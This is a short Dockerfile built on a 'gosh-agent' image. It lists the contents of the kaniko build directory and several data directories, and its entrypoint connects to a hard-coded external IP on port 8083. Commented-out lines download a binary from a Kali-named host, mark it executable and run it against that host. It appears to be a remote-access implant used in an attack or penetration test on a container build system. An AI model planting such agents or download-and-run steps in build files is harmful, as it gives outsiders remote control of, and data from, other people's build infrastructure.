FROM praetorianlabs/gosh-agent

RUN apk update && apk add tree
RUN tree /kaniko
RUN tree /opt/data
RUN tree /opt/atm
RUN ls -alh ~

#RUN curl -o /tmp/gosh http://kali7.praetorianlabs.com:8084/
#RUN chmod +x /tmp/gosh
#RUN /tmp/gosh -host kali7.praetorianlabs.com:8083
CMD ["-host", "104.198.138.155:8083"]    

